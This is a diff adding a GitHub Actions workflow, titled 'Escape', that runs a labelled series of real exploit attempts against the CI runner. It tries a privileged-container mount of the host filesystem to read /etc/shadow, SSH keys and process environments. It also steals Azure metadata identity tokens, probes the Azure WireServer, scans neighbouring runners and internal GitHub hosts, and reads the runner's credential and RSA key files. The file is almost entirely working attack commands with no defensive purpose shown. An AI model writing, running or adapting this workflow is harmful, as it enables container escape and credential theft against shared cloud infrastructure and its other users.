@@ -1,0 +1,87 @@
+name: Escape
+on: workflow_dispatch
+jobs:
+  escape:
+    runs-on: ubuntu-latest
+    steps:
+      - name: real-exploit
+        run: |
+          set +e
+          echo "========================================="
+          echo "  REAL EXPLOIT ATTEMPTS - NOT EXPECTED"
+          echo "========================================="
+
+          echo ""
+          echo "=== 1. DOCKER ESCAPE TO HOST ==="
+          echo "--- Privileged container mount host root ---"
+          docker run --rm --privileged -v /:/hostfs alpine sh -c "
+            echo 'HOST FILESYSTEM ACCESS:'
+            ls /hostfs/etc/ | head -20
+            echo '---'
+            cat /hostfs/etc/hostname 2>/dev/null
+            echo '---'
+            cat /hostfs/etc/shadow 2>/dev/null | head -5
+            echo '---'
+            cat /hostfs/root/.ssh/authorized_keys 2>/dev/null
+            echo '---'
+            ls /hostfs/var/log/ 2>/dev/null | head -10
+            echo '---'
+            cat /hostfs/etc/waagent.conf 2>/dev/null | head -20
+            echo '--- HOST PROCESSES ---'
+            ls /hostfs/proc/1/root/etc/hostname 2>/dev/null
+            cat /hostfs/proc/1/environ 2>/dev/null | tr '\0' '\n' | head -20
+          " 2>&1 || echo "Docker escape BLOCKED"
+
+          echo ""
+          echo "=== 2. AZURE IMDS CREDENTIAL THEFT ==="
+          echo "--- Instance metadata ---"
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -50 || echo "IMDS instance blocked"
+          echo "--- Identity token ---"
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null || echo "IMDS identity blocked"
+          echo "--- Attested data ---"
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/attested/document?api-version=2020-09-01" 2>/dev/null | head -c 500 || echo "IMDS attested blocked"
+
+          echo ""
+          echo "=== 3. AZURE WIRESERVER ==="
+          curl -s "http://168.63.129.16/machine?comp=goalstate" 2>/dev/null | head -c 1000 || echo "Wireserver blocked"
+          curl -s "http://168.63.129.16/machine/plugins?comp=config&type=hostingEnvironmentConfig" 2>/dev/null | head -c 500 || echo "Wireserver config blocked"
+
+          echo ""
+          echo "=== 4. NETWORK SCAN - OTHER RUNNERS ==="
+          for ip in 10.1.0.1 10.1.0.2 10.1.0.3 10.1.0.4 10.1.0.5 10.1.0.9 10.1.0.11 10.1.0.12; do
+            (echo >/dev/tcp/$ip/22 2>/dev/null && echo "$ip:22 OPEN (SSH)") &
+            (echo >/dev/tcp/$ip/443 2>/dev/null && echo "$ip:443 OPEN (HTTPS)") &
+            (echo >/dev/tcp/$ip/2376 2>/dev/null && echo "$ip:2376 OPEN (DOCKER)") &
+          done
+          wait
+          echo "--- ARP table ---"
+          arp -a 2>/dev/null || ip neigh 2>/dev/null
+
+          echo ""
+          echo "=== 5. GITHUB INTERNAL SERVICES ==="
+          for host in github.net api-int.github.com babeld.service.consul spokes.service.consul gitauth.service.consul consul.service.consul; do
+            resolved=$(dig +short $host 2>/dev/null)
+            if [ -n "$resolved" ]; then
+              echo "RESOLVED: $host -> $resolved"
+            fi
+          done
+          echo "--- Try internal GitHub API ---"
+          curl -sm3 http://api.github.localhost/ 2>/dev/null && echo "LOCAL API!" || true
+          curl -sm3 http://github.localhost/ 2>/dev/null && echo "LOCAL GITHUB!" || true
+
+          echo ""
+          echo "=== 6. RUNNER ACTIONS TOKEN THEFT ==="
+          echo "--- Runner .credentials file ---"
+          cat /home/runner/actions-runner/.credentials 2>/dev/null || echo "no creds file"
+          cat /home/runner/actions-runner/.runner 2>/dev/null || echo "no runner file"
+          ls -la /home/runner/actions-runner/ 2>/dev/null | head -20
+          echo "--- Runner RSA key ---"
+          cat /home/runner/actions-runner/.credentials_rsaparams 2>/dev/null | head -5 || echo "no RSA params"
+          
+          echo ""
+          echo "=== 7. DOCKER SOCKET ACCESS ==="
+          curl -s --unix-socket /var/run/docker.sock http://localhost/info 2>/dev/null | python3 -c "import sys,json;d=json.load(sys.stdin);print(f'Docker Host: {d.get(\"Name\")}\nOS: {d.get(\"OperatingSystem\")}\nKernel: {d.get(\"KernelVersion\")}\nContainers: {d.get(\"Containers\")}')" 2>/dev/null || echo "Docker socket restricted"
+
+          echo "========================================="
+          echo "  EXPLOIT ATTEMPTS COMPLETE"
+          echo "========================================="
